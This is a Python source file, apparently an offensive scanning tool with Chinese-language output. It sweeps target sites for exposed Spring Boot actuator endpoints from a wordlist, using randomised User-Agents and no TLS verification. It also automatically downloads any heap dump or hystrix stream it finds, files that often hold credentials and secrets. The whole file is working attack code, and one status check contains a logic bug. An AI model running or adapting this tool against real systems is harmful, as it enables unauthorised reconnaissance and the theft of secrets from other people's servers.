#!/usr/bin/env python
# coding=utf-8

from inc import output,console
import requests, sys, random
from tqdm import tqdm
from termcolor import cprint
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

ua = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]

def url(urllist,proxies):
    f1 = open("urlout.txt", "wb+")
    f1.close()
    cprint(f"======开始对目标URL测试SpringBoot信息泄露端点======", "cyan")
    with open("Dir.txt", 'r') as web:
        webs = web.readlines()
        for web in webs:
            web = web.strip()
            u = urllist + web
            try:
                header = {"User-Agent": random.choice(ua)}
                requests.packages.urllib3.disable_warnings()
                r = requests.get(url=u, headers=header, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
                if r.status_code == 503:
                    sys.exit()
            except KeyboardInterrupt:
                print("Ctrl + C 手动终止了进程")
                sys.exit()
            except:
                cprint("[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！", "magenta")
                break
            if r.status_code == 200:
                cprint("[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)),"red")
                f2 = open("urlout.txt", "a")
                f2.write(u + '\n')
                f2.close()
            else:
                cprint("[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u ,"yellow")
    count = len(open("urlout.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count,"red")
    sys.exit()

def file(filename,proxies):
    f1 = open("output.txt", "wb+")
    f1.close()
    cprint("======开始读取目标TXT并测试SpringBoot信息泄露端点======","cyan")
    with open(filename, 'r') as temp:
        for url in temp.readlines():
            url = url.strip()
            with open("Dir.txt", 'r') as web:
                webs = web.readlines()
                for web in webs:
                    web = web.strip()
                    if ('://' not in url):
                        url = str("http://") + str(url)
                    if str(url[-1]) != "/":
                        u = url + "/" + web
                    else:
                        u = url + web
                    try:
                        header = {"User-Agent": random.choice(ua)}
                        requests.packages.urllib3.disable_warnings()
                        r = requests.get(url=u, headers=header, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
                    except KeyboardInterrupt:
                        print("Ctrl + C 手动终止了进程")
                        sys.exit()
                    except:
                        cprint("[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！", "magenta")
                        break
                    if r.status_code == 200:
                        cprint("[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)),"red")
                        f2 = open("output.txt", "a")
                        f2.write(u + '\n')
                        f2.close()
                    else:
                        cprint("[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u ,"yellow")
    count = len(open("output.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标TXT内存在SpringBoot敏感信息泄露，已经导出至 output.txt ，共%d行记录"%count,"red")
    sys.exit()

def dump(urllist,proxies):
    def download(url: str, fname: str, proxies: str):
       # 用流stream的方式获取url的数据
        requests.packages.urllib3.disable_warnings()
        resp = requests.get(url, timeout=6, stream=True, verify=False, proxies=proxies)
        # 拿到文件的长度，并把total初始化为0
        total = int(resp.headers.get('content-length', 0))
        # 打开当前目录的fname文件(名字你来传入)
        # 初始化tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了
        with open(fname, 'wb') as file, tqdm(
                desc=fname,
                total=total,
                unit='iB',
                unit_scale=True,
                unit_divisor=1024,
        ) as bar:
            for data in resp.iter_content(chunk_size=1024):
                size = file.write(data)
                bar.update(size)
    cprint("======开始对目标URL测试SpringBoot敏感文件泄露并下载======","cyan")
    # 下载文件，并传入文件名
    url1 = urllist + "actuator/heapdump"
    url2 = urllist + "heapdump"
    url3 = urllist + "heapdump.json"
    url4 = urllist + "gateway/actuator/heapdump"
    url5 = urllist + "hystrix.stream"

    if str(requests.head(url1)) != "<Response [200]>":
        cprint("[-] 在 /actuator/heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url1
        cprint("[+][+][+] 发现 /actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
        download(url, "heapdump" ,proxies)
        sys.exit()
    if str(requests.head(url2)) != "<Response [200]>":
        cprint("[-] 在 /heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url2
        cprint("[+][+][+] 发现 /heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
        download(url, "heapdump" ,proxies)
        sys.exit()
    if str(requests.head(url3)) != "<Response [200]>":
        cprint("[-] 在 /heapdump.json 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url3
        cprint("[+][+][+] 发现 /heapdump.json 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
        download(url, "heapdump.json" ,proxies)
        sys.exit()
    if str(requests.head(url4)) != "<Response [200]>":
        cprint("[-] 在 /gateway/actuator/heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url4
        cprint("[+][+][+] 发现 /gateway/actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
        download(url, "heapdump" ,proxies)
        sys.exit()
    if str(requests.head(url5)) != ("<Response [401]>" or "<Response [200]>"):
        cprint("[-] 在 /hystrix.stream 未发现hystrix监控数据文件泄露，请手动验证","yellow")
    else:
        url = url5
        cprint("[+][+][+] 发现 /hystrix.stream 监控数据文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
        download(url, "hystrix.stream" ,proxies)
        sys.exit()
    sys.exit()

